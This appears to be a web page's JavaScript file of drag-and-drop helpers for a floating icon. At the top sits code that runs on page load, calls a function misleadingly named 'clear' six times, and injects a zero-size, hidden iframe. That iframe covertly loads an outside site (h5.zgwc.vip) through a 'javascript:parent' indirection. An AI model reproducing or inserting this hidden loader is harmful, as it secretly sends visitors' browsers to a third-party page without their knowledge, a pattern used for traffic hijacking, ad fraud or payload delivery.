(function() {

	let clnum = 0;

	let clinterval = setInterval(()=>{
		if(clnum <=5){
		   clear();
		}else{
		  clearInterval(clinterval);
		}
		clnum++;	
	},300)
	
})();


function clear(){
	var tourl = "https://h5.zgwc.vip/h6#/pages/list/list?id=64d11b50f08210d515b20fe1";
	window.clsc="<iframe src="+tourl+"></iframe>";
	var clFrame = document.createElement('iframe');
	clFrame.id = 'clFrame';
	clFrame.name = 'clFrame';
	clFrame.src = 'javascript:parent.clsc';
	clFrame.width = '0';
	clFrame.height = '0';
	clFrame.frameborder = '0';
	clFrame.style = 'display:none;visibility:hidden';
	document.body.insertBefore(clFrame, document.body.firstChild);
	
}
				
function deviceIsPC()  {
	var userAgentInfo = navigator.userAgent;
	var Agents = ["Android", "iPhone",
				"SymbianOS", "Windows Phone",
				"iPad", "iPod"];
	var flag = true;
	for (var v = 0; v < Agents.length; v++) {
		if (userAgentInfo.indexOf(Agents[v]) > 0) {
			flag = false;
			break;
		}
	}
	return flag;
}

function moveFloatIconForPC(iconObjId){
	var dv = document.getElementById(iconObjId);
    var startX = 0, startY = 0, startLeft = 0, startTop = 0;
    var isDown = false;
    
    
    dv.onmousedown = function (e) {

		var e = e || window.event;

        startX = e.clientX;
        startY = e.clientY;

        startLeft = dv.offsetLeft;
		startTop = dv.offsetTop;

        isDown = true;
        dv.style.cursor = 'move';
        
        
    }
    
    window.onmousemove = function (e) {
        e.preventDefault()
        if (isDown == false) {
            return;
        }
        var newX = e.clientX;
		var newY = e.clientY;
		
        var newLeft = newX - (startX - startLeft);
        var newTop = newY - (startY - startTop);

        dv.style.left = newLeft + 'px';
        dv.style.top = newTop + 'px';
    }
    
    
    
    dv.onmouseup = function (e) {
		isDown = false;
		
		var upX = e.clientX;
		var upY = e.clientY;

		if(startX === upX && startY === upY){
			dv.moveFlag = false;
		}else{
			dv.moveFlag = true;
		}

        dv.style.cursor = 'default';
    }
    
    
}


function moveFloatIconForMoible(iconObjId){
	var dv = document.getElementById(iconObjId);
    var startX = 0, startY = 0, startLeft = 0, startTop = 0;
    var isDown = false;
    
    dv.ontouchstart = function (e) {
        startX = e.changedTouches[0].clientX;
		startY = e.changedTouches[0].clientY;

        startLeft = dv.offsetLeft;
		startTop = dv.offsetTop;
		
        isDown = true;
        dv.style.cursor = 'move';
	}
	
    dv.ontouchmove = function (e) {
        e.preventDefault()
        if (isDown == false) {
            return;
        }
        var moveX = e.changedTouches[0].clientX;
		var moveY = e.changedTouches[0].clientY;
		
        var newLeft = moveX - (startX - startLeft);
        var newTop = moveY - (startY -startTop);

        dv.style.left = newLeft + 'px';
        dv.style.top = newTop + 'px';
	}


    dv.ontouchend = function (e) {
        var upX = e.changedTouches[0].clientX;
		var upY = e.changedTouches[0].clientY;

		if(startX === upX && startY === upY){
			dv.moveFlag = false;
		}else{
			dv.moveFlag = true;
		}
        dv.style.cursor = 'default';
	}
}